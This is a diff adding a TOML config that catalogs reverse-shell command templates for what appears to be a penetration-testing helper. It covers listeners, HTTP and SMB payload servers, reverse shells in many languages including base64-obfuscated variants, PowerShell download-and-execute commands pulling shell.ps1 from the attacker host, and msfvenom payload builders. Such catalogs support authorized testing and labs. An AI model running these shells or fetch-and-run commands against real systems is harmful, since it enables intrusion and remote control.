@@ -1,0 +1,233 @@
+category = "reverse-shells"
+display_name = "Reverse Shells"
+icon = "󰒓"
+order = 90
+
+[[command]]
+id = "rs.listener.nc"
+title = "nc listener"
+template = "${fn:nc_listener({lport})}"
+requires = ["nc"]
+tags = ["listener"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.listener.rlwrap_nc"
+title = "rlwrap nc listener (better history)"
+template = "${fn:rlwrap_nc_listener({lport})}"
+requires = ["nc", "rlwrap"]
+tags = ["listener"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.listener.ncat_ssl"
+title = "ncat SSL listener"
+template = "${fn:ncat_ssl_listener({lport})}"
+requires = ["ncat"]
+tags = ["listener", "tls"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.listener.socat"
+title = "socat pty listener"
+template = "${fn:socat_listener({lport})}"
+requires = ["socat"]
+tags = ["listener", "pty"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.serve.python_http"
+title = "python http file server"
+template = "${fn:python_http(80)}"
+requires = ["python3"]
+tags = ["serve", "delivery"]
+
+[[command]]
+id = "rs.serve.smbserver"
+title = "impacket smbserver"
+template = "impacket-smbserver share $(pwd) -smb2support -username chrono -password chronopass"
+requires = ["impacket-smbserver"]
+tags = ["serve", "smb"]
+
+[[command]]
+id = "rs.bash"
+title = "bash reverse"
+template = "${fn:bash_rev({lhost}, {lport})}"
+tags = ["payload", "bash"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.bash_b64"
+title = "bash reverse (base64 wrapped)"
+template = "${fn:bash_rev_b64({lhost}, {lport})}"
+tags = ["payload", "bash", "b64"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.sh"
+title = "sh reverse"
+template = "${fn:sh_rev({lhost}, {lport})}"
+tags = ["payload", "sh"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.nc_e"
+title = "nc -e reverse"
+template = "${fn:nc_rev({lhost}, {lport})}"
+tags = ["payload", "nc"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.nc_mkfifo"
+title = "nc + mkfifo reverse (no -e support)"
+template = "${fn:nc_mkfifo({lhost}, {lport})}"
+tags = ["payload", "nc", "mkfifo"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.python"
+title = "python reverse (pty)"
+template = "${fn:python_rev({lhost}, {lport})}"
+tags = ["payload", "python"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.python3"
+title = "python3 reverse (pty)"
+template = "${fn:python3_rev({lhost}, {lport})}"
+tags = ["payload", "python3"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.perl"
+title = "perl reverse"
+template = "${fn:perl_rev({lhost}, {lport})}"
+tags = ["payload", "perl"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.php"
+title = "php reverse"
+template = "${fn:php_rev({lhost}, {lport})}"
+tags = ["payload", "php"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.ruby"
+title = "ruby reverse"
+template = "${fn:ruby_rev({lhost}, {lport})}"
+tags = ["payload", "ruby"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.socat"
+title = "socat reverse (pty)"
+template = "${fn:socat_rev({lhost}, {lport})}"
+tags = ["payload", "socat", "pty"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.awk"
+title = "awk reverse"
+template = "${fn:awk_rev({lhost}, {lport})}"
+tags = ["payload", "awk"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.lua"
+title = "lua reverse"
+template = "${fn:lua_rev({lhost}, {lport})}"
+tags = ["payload", "lua"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.ps.rev"
+title = "powershell reverse"
+template = "${fn:ps_rev({lhost}, {lport})}"
+tags = ["payload", "powershell"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.ps.rev_b64"
+title = "powershell reverse (base64)"
+template = "${fn:ps_rev_b64({lhost}, {lport})}"
+tags = ["payload", "powershell", "b64"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.ps.iex_b64"
+title = "powershell IEX (b64) — URL"
+template = "${fn:ps_iex_b64(http://{lhost}/shell.ps1)}"
+tags = ["payload", "powershell", "iex"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.ps.downloadstring"
+title = "powershell DownloadString"
+template = "${fn:ps_downloadstring(http://{lhost}/shell.ps1)}"
+tags = ["payload", "powershell"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.upgrade.python3"
+title = "PTY upgrade (python3)"
+template = "${fn:pty_upgrade_python3()}"
+tags = ["upgrade", "pty"]
+
+[[command]]
+id = "rs.upgrade.python2"
+title = "PTY upgrade (python2)"
+template = "${fn:pty_upgrade_python2()}"
+tags = ["upgrade", "pty"]
+
+[[command]]
+id = "rs.upgrade.script"
+title = "PTY upgrade (script)"
+template = "${fn:pty_upgrade_script()}"
+tags = ["upgrade", "pty"]
+
+[[command]]
+id = "rs.upgrade.stty_dance"
+title = "post-upgrade stty dance (reminder)"
+template = "${fn:stty_after_upgrade()}"
+tags = ["upgrade", "pty"]
+
+[[command]]
+id = "rs.msfvenom.elf"
+title = "msfvenom linux/x64 elf"
+template = "${fn:msfvenom_linux_x64_elf({lhost}, {lport})}"
+requires = ["msfvenom"]
+tags = ["payload", "msfvenom", "linux"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.msfvenom.exe"
+title = "msfvenom windows/x64 exe"
+template = "${fn:msfvenom_windows_x64_exe({lhost}, {lport})}"
+requires = ["msfvenom"]
+tags = ["payload", "msfvenom", "windows"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.msfvenom.war"
+title = "msfvenom java/jsp WAR"
+template = "${fn:msfvenom_war({lhost}, {lport})}"
+requires = ["msfvenom"]
+tags = ["payload", "msfvenom", "java"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.msfvenom.php"
+title = "msfvenom php/reverse_php"
+template = "${fn:msfvenom_php({lhost}, {lport})}"
+requires = ["msfvenom"]
+tags = ["payload", "msfvenom", "php"]
+when = "target.has_lhost"
+
+[[command]]
+id = "rs.msfvenom.aspx"
+title = "msfvenom aspx (Windows)"
+template = "${fn:msfvenom_aspx({lhost}, {lport})}"
+requires = ["msfvenom"]
+tags = ["payload", "msfvenom", "aspx"]
+when = "target.has_lhost"
